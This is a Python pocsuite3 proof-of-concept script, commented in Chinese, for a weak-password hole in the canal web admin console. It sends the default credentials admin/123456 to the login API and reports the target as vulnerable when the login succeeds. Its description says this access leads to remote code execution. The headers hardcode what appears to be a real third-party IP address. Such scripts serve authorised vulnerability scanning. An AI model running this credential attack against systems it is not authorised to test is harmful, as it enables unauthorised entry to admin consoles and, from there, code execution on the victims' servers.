from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class CANALPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-10-16"  # 漏洞公开的时间
    createDate = "2022-10-16"  # 编写 PoC 的日期
    updateDate = "2022-10-16"  # PoC 更新的时间
    references = [""]  # 漏洞地址来源
    name = "canal 后台存在弱口令漏洞 PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "canal"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖
    desc = """canal 后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码

        headers = {"Accept": "application/json, text/plain, */*",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
                   "Content-Type": "application/json;charset=UTF-8", "Origin": "http://42.192.73.35",
                   "Referer": "http://42.192.73.35/", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        json = {"password": "123456", "username": "admin"}

        result = []
        try:
            url = self.url.strip() + "/api/v1/user/login"  # self.url 就是你指定的-u 参数的值
            res = requests.post(url=url, headers=headers, json=json, verify=False, timeout=9)
            data_dict = res.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 20000 and data_dict.get("msg") == None:
                result.append(url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(CANALPOC)
